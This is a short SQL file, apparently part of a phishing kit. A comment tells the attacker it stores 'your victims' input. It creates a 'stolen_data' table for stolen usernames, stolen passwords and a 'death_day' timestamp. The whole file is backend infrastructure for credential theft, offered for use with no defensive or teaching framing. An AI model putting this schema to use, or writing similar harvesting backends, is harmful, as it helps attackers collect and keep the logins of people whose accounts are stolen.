-- You can use this query if you want your victims
-- user input into a database.
CREATE TABLE stolen_data (
  id INT NOT NULL PRIMARY KEY AUTO_INCREMENT,
  stolen_username VARCHAR(100) NOT NULL,
  stolen_password VARCHAR(255) NOT NULL,
  death_day DATETIME DEFAULT CURRENT_TIMESTAMP
);
